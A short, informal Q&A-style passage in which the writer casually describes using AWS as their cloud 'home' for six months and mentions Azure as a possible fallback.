If something do go wrong it would be up for larger companies like Reddit, Github, HuggingFace, Vercel, Netflix, Dropbox, GradeScope, Amazonthe ecommerce platform, ... the list goes on to worry sick with their excellent silicon valley programmers!
What cloud platform have you been using as your remote home for the past six months?
AWS is a fun playground and I enjoy playing in it. In fact, I am living in it, and it has been my remote home for half a year now!
What is your current cloud provider situation and future plans?
I frequently move around and I believe AWS will be my permanent home!though not ruling out the possibility that if AWS dies I might use Azure or something, anyways, in the meantime, enjoy
